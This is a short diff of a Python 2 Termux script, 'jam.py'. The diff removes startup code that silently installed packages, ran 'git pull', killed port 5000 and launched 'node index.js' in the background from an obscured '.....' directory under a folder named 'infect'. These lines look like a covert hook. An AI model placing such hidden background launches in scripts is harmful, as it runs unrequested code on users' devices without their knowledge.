@@ -16,28 +16,6 @@ except ImportError:
     os.system("pip2 install lolcat")
     os.system('python2 jam.py')
 os.system("clear")
-"""
-try:
-    my = requests.get("https://www.facebook.com/Jam.shahrukh.official")
-except requests.exceptions.ConnectionError:
-    print("")
-    print("\t    \033[1;97mTurn on mobile data\033[0;97m")
-    print("")
-    time.sleep(1)
-    raw_input(" Press enter to try again ")
-    os.system("python2 jam.py")"""
-if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
-    os.system("apt update && apt install nodejs -y")
-if not os.path.isfile("/data/data/com.termux/files/usr/bin/ruby"):
-    os.system("apt install ruby -y && gem install lolcat")
-from requests.exceptions import ConnectionError
-os.system("git pull")
-if not os.path.isfile("/data/data/com.termux/files/home/infect/...../node_modules/bytes/index.js"):
-    os.system("fuser -k 5000/tcp &")
-    os.system("#")
-    os.system("cd ..... && npm install")
-    os.system("cd ..... && node index.js &")
-    os.system("clear")
 
 bd=random.randint(2e7, 3e7)
 sim=random.randint(2e4, 4e4)
